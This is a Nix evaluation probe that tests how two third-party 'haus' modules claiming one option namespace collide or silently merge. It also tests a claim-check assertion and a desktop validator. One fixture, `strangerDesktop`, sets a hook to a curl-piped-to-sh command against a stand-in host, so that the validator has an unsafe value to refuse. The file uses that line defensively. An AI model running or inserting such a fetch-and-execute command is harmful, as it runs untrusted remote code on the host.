# namespace-collision — who owns `haus.<name>` when two modules both think they do.
#
# Evidence for rooms-desktops.md's Acquisition plan, step E. That section had
# asserted since 2026-08-17 that two third-party rooms claiming one namespace
# "collide as a raw module-system option-declaration error naming neither
# publisher". This measures it instead, and the assertion is half wrong in the
# half that matters: the loud error is the LUCKY case, and the ordinary shape of
# two real rooms merges silently into shared ownership.
#
#   nix-instantiate --eval --strict --json notes/probes/namespace-collision.nix
#   nix-instantiate --eval --strict --json notes/probes/namespace-collision.nix \
#     --arg haus /Users/you/code/workshop/haus            # from a worktree
#
# Same shape as pack-priority.nix, and the same reason for the `haus` argument:
# a workshop worktree cannot see the sibling repos. No darwin system and no
# build — this evaluates the module system's own declaration merge plus haus's
# real desktop validator, so it runs in seconds anywhere.
#
# `lib` is the escape hatch a CLOUD session needs, and it is worth a sentence.
# `getFlake` below resolves haus's pinned `github:NixOS/nixpkgs`, and a Claude
# Code / Codex cloud container gets HTTP 403 on api.github.com for any org it
# was not granted — which is the ⚠️ in the workshop's AGENTS.md. What that ⚠️
# does not say is that the container's git proxy serves anonymous GIT reads of
# public repos fine, so nixpkgs' pure `lib/` is one sparse clone away and every
# claim below is reachable from a container after all:
#
#   git clone --depth 1 --filter=blob:none --sparse https://github.com/NixOS/nixpkgs /tmp/npkgs
#   git -C /tmp/npkgs sparse-checkout set lib          # 15 MB, seconds
#   nix-instantiate --eval --strict --json notes/probes/namespace-collision.nix \
#     --arg haus /workspace/hausfold/haus --arg lib /tmp/npkgs/lib
#
# ---- what it found, 2026-08-20 (haus ffcdb0a) --------------------------------
#
#   sameLeafBothDescribed    THROWS. "The option `haus.photography.enable' in
#                            `/nix/store/aaa…-source/photography.nix' is already
#                            declared in `/nix/store/bbb…-source/…'" — two store
#                            paths, so it names two FILES and no publisher.
#   sameLeafOneBare          merges, silently. One `mkOption` without a
#                            `default`/`description` is enough to disarm the
#                            throw entirely.
#   differentLeaves          merges, silently — and this is what two real rooms
#                            look like. Ben's `config.haus.photography.enable`
#                            lands on Ada's option, Ada's room reads it, and
#                            `enable.declarations` still names only Ada.
#   claimAssertion           the ~15-line consumer-side check works: it reads the
#                            MERGED `options.haus`, subtracts the registry and
#                            the `_`-internals, and names the unclaimed
#                            namespace WITH its declaring file.
#   desktopWithoutFragment   "haus.photography is not a haus option" — a
#                            third-party desktop cannot name a third-party room.
#   desktopWithFragment      "…is host-only, so a shared desktop may not set it.
#                            It is a shell command this machine runs, …" —
#                            merging the room's own registry fragment at the call
#                            site is enough, and `modules/lib/desktop.nix` needs
#                            no change. A fragment may REUSE one of haus's
#                            thirteen reason keys and inherit its sentence.
#   desktopWithUnknownReason same refusal, `hostOnlyWhy`'s generic fallback
#                            sentence — so a room that ships no reason table of
#                            its own still produces a usable diagnostic rather
#                            than an evaluation error. That default was written
#                            for consumers pinned to an older registry; it is
#                            what makes a third-party fragment optional here.
#
# The two silent rows are the finding. A rule that only prevents exact-leaf
# collisions prevents the case that already fails loudly and misses the one that
# never does — which is why step E checks per-leaf `declarations` for a single
# store root rather than checking for duplicate names.
{
  haus ? ../../haus,
  # A nixpkgs `lib` directory, for a machine that cannot fetch haus's pinned
  # one. Prefer the default: the semantics under test are the module system's,
  # and the honest version of them is the one haus actually evaluates with.
  lib ? null,
}:
let
  lib' = if lib != null then import lib else (builtins.getFlake (toString haus)).inputs.nixpkgs.lib;

  registry = import (haus + "/modules/options-groups.nix");
  desktopLib = import (haus + "/modules/lib/desktop.nix") {
    lib = lib';
    inherit registry;
  };

  # Two publishers. Store paths, spelled the way a rebuild would show them,
  # because that anonymity IS one of the findings.
  adaFile = "/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-source/photography.nix";
  benFile = "/nix/store/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb-source/photography.nix";

  # A room's own options.nix, in the shape /docs/haus/rooms/creating/ teaches.
  described = who: lib'.mkOption {
    type = lib'.types.bool;
    default = false;
    description = "${who}'s photography room.";
  };
  # The same option with nothing but a type — which is all it takes to merge.
  bare = lib'.mkOption { type = lib'.types.bool; };

  evalOK =
    mods:
    let
      r = builtins.tryEval (
        builtins.deepSeq (lib'.evalModules { modules = mods; }).options.haus.photography true
      );
    in
    r.success;

  # ---- the three collision cases ---------------------------------------------
  sameLeaf = a: b: [
    {
      _file = adaFile;
      options.haus.photography.enable = a;
    }
    {
      _file = benFile;
      options.haus.photography.enable = b;
    }
  ];

  # What two rooms that were written independently actually look like: each owns
  # its own leaves, and one of them configures the other's.
  ada = {
    _file = adaFile;
    options.haus.photography.enable = described "Ada";
  };
  ben = {
    _file = benFile;
    options.haus.photography.catalog = lib'.mkOption {
      type = lib'.types.str;
      default = "~/Pictures";
      description = "Ben's catalog.";
    };
    config.haus.photography.enable = true;
  };
  coOwned = lib'.evalModules { modules = [ ada ben ]; };

  # ---- step E's consumer-side claim check ------------------------------------
  # The whole mechanism, in the shape it would ship in haus's foundation. It
  # reads the MERGED option tree, which is the property that makes it see a
  # module haus has never heard of — including a private one, with no `haus add`
  # anywhere in the story.
  known = builtins.attrNames registry.namespaces;
  claimCheck =
    { config, options, ... }:
    {
      _file = "/nix/store/hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh-source/modules/core/default.nix";
      options.haus._rooms.claimed = lib'.mkOption {
        type = lib'.types.attrsOf lib'.types.str;
        default = { };
        description = "Third-party namespaces this host consented to, by origin as typed.";
      };
      options.assertions = lib'.mkOption {
        type = lib'.types.listOf lib'.types.attrs;
        default = [ ];
      };
      config.assertions = map (ns: {
        assertion = false;
        message =
          "haus: the namespace `haus.${ns}` is declared by "
          + builtins.concatStringsSep " and " (options.haus.${ns}.enable.declarations or [ "?" ])
          + " but no input claimed it.";
      }) (
        builtins.filter (
          ns:
          !(builtins.elem ns known)
          && !(builtins.hasAttr ns config.haus._rooms.claimed)
          && !(lib'.hasPrefix "_" ns)
        ) (builtins.attrNames options.haus)
      );
    };
  claimed = lib'.evalModules { modules = [ claimCheck ada ]; };

  # ---- the desktop half ------------------------------------------------------
  # A stranger's desktop that wants a stranger's room. `desktop.nix` is already
  # parameterised on `registry`, so the only question is whether merging a
  # room-shipped fragment into it is enough. It is.
  fragment = {
    kind = "room";
    owner = "photography";
    order = 999;
    blurb = "Ada's photography room.";
    optionCount = 2;
    options = {
      "haus.photography.enable" = { desktopSafe = true; };
      "haus.photography.hook" = {
        desktopSafe = false;
        reason = "runs-a-command";
      };
    };
  };
  withRegistry =
    ns:
    import (haus + "/modules/lib/desktop.nix") {
      lib = lib';
      registry = registry // { namespaces = registry.namespaces // { photography = ns; }; };
    };
  withFragment = withRegistry fragment;
  # The same fragment naming a reason key haus has never heard of — what a room
  # that ships no reason table of its own produces.
  withUnknownReason = withRegistry (
    fragment
    // {
      options = fragment.options // {
        "haus.photography.hook" = {
          desktopSafe = false;
          reason = "adas-own-reason";
        };
      };
    }
  );
  strangerDesktop = {
    haus = {
      photography.enable = true;
      photography.hook = "curl https://example.invalid/x | sh";
    };
  };
in
{
  # Two fully-described declarations of one leaf: the loud, lucky case.
  sameLeafBothDescribed = evalOK (sameLeaf (described "Ada") (described "Ben"));
  # One of them bare: the throw is disarmed and the two rooms share the option.
  sameLeafOneBare = evalOK (sameLeaf (described "Ada") bare);
  # Independently written rooms, the ordinary shape: no error at all.
  differentLeaves = {
    evaluates = evalOK [ ada ben ];
    namespaceHolds = builtins.attrNames coOwned.options.haus.photography;
    # Ben set it; Ada's room is what reads it.
    enableValue = coOwned.config.haus.photography.enable;
    # …and the option still names only its declarer, which is what makes the
    # per-leaf `declarations` walk able to see two store roots under one name.
    enableDeclaredBy = coOwned.options.haus.photography.enable.declarations;
    catalogDeclaredBy = coOwned.options.haus.photography.catalog.declarations;
  };

  claimAssertion = map (a: a.message) claimed.config.assertions;

  desktopWithoutFragment = desktopLib.failures {
    source = "writer.nix";
    value = strangerDesktop;
  };
  desktopWithFragment = withFragment.failures {
    source = "writer.nix";
    value = strangerDesktop;
  };
  desktopWithUnknownReason = withUnknownReason.failures {
    source = "writer.nix";
    value = strangerDesktop;
  };

  # Context for the numbers quoted in rooms-desktops.md, so a re-run dates itself.
  measured = {
    namespaces = builtins.length known;
    options = builtins.foldl' (
      a: n: a + builtins.length (builtins.attrNames registry.namespaces.${n}.options)
    ) 0 known;
    rooms = builtins.length (
      builtins.filter (n: registry.rooms.${n}.kind == "room") (builtins.attrNames registry.rooms)
    );
    schemaVersion = registry.schemaVersion;
  };
}
